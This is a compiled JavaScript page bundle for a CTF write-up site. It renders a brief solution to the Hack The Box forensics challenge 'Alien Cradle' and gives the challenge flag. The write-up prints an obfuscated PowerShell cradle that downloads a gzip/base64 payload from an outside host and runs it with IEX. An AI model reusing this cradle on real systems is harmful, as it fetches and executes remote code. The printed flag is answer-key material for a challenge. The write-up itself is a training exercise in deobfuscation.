"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[98472],{16624:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>o,contentTitle:()=>l,default:()=>h,frontMatter:()=>i,metadata:()=>r,toc:()=>c});const r=JSON.parse('{"id":"HackTheBox/Challenges/Forensics/Alien Cradle/index","title":"Alien Cradle","description":"Difficulty: VERY EASY","source":"@site/docs/HackTheBox/Challenges/Forensics/Alien Cradle/index.md","sourceDirName":"HackTheBox/Challenges/Forensics/Alien Cradle","slug":"/HackTheBox/Challenges/Forensics/Alien Cradle/","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Challenges/Forensics/Alien Cradle/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Challenges/Forensics/Alien Cradle/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"Forensics","permalink":"/Target-Machines-WriteUp/docs/category/HackTheBox-Challenges-Forensics"},"next":{"title":"Extraterrestrial Persistence","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Challenges/Forensics/Extraterrestrial Persistence/"}}');var a=t(74848),s=t(28453);const i={},l="Alien Cradle",o={},c=[];function d(e){const n={admonition:"admonition",code:"code",h1:"h1",header:"header",p:"p",pre:"pre",...(0,s.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.header,{children:(0,a.jsx)(n.h1,{id:"alien-cradle",children:"Alien Cradle"})}),"\n",(0,a.jsxs)(n.admonition,{title:"CHALLENGE DESCRIPTION",type:"note",children:[(0,a.jsx)(n.p,{children:"Difficulty: VERY EASY"}),(0,a.jsx)(n.p,{children:"In an attempt for the aliens to find more information about the relic, they launched an attack targeting Pandora's close friends and partners that may know any secret information about it. During a recent incident believed to be operated by them, Pandora located a weird PowerShell script from the event logs, otherwise called PowerShell cradle. These scripts are usually used to download and execute the next stage of the attack. However, it seems obfuscated, and Pandora cannot understand it. Can you help her deobfuscate it?"}),(0,a.jsx)(n.p,{children:"\u4e3a\u4e86\u83b7\u53d6\u66f4\u591a\u5173\u4e8e\u9057\u8ff9\u7684\u4fe1\u606f\uff0c\u5916\u661f\u4eba\u53d1\u52a8\u4e86\u4e00\u573a\u88ad\u51fb\uff0c\u76ee\u6807\u662f\u6f58\u591a\u62c9\u7684\u5bc6\u53cb\u548c\u5408\u4f5c\u4f19\u4f34\uff0c\u56e0\u4e3a\u4ed6\u4eec\u53ef\u80fd\u638c\u63e1\u7740\u6709\u5173\u9057\u8ff9\u7684\u79d8\u5bc6\u60c5\u62a5\u3002\u5728\u6700\u8fd1\u4e00\u8d77\u88ab\u6000\u7591\u662f\u4ed6\u4eec\u64cd\u7eb5\u7684\u4e8b\u4ef6\u4e2d\uff0c\u6f58\u591a\u62c9\u4ece\u4e8b\u4ef6\u65e5\u5fd7\u4e2d\u53d1\u73b0\u4e86\u4e00\u4e2a\u5947\u602a\u7684PowerShell\u811a\u672c\uff0c\u4e5f\u79f0\u4e3aPowerShell\u201c\u6447\u7bee\u201d\u3002\u8fd9\u4e9b\u811a\u672c\u901a\u5e38\u7528\u4e8e\u4e0b\u8f7d\u5e76\u6267\u884c\u653b\u51fb\u7684\u4e0b\u4e00\u9636\u6bb5\u3002\u7136\u800c\uff0c\u8fd9\u4e2a\u811a\u672c\u4f3c\u4e4e\u7ecf\u8fc7\u4e86\u6df7\u6dc6\uff0c\u6f58\u591a\u62c9\u65e0\u6cd5\u7406\u89e3\u5b83\u3002\u4f60\u80fd\u5e2e\u5979\u53bb\u6df7\u6dc6\u5417\uff1f"})]}),"\n",(0,a.jsx)(n.p,{children:"\u9644\u4ef6\u4e3a\u4e00\u4efd Powershell \u811a\u672c"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-powershell",children:"if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\\Arth'){exit};\n$w = New-Object net.webclient;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;\n$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');\n$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));\n$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';\nIEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u4ece\u4e2d\u5c31\u80fd\u5f97\u5230 flag"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"PowerShell 7.4.1\nPS C:\\Users\\Randark> 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}'\nHTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Flag"',children:"HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}\n"})})]})}function h(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>l});var r=t(96540);const a={},s=r.createContext(a);function i(e){const n=r.useContext(s);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),r.createElement(s.Provider,{value:n},e.children)}}}]);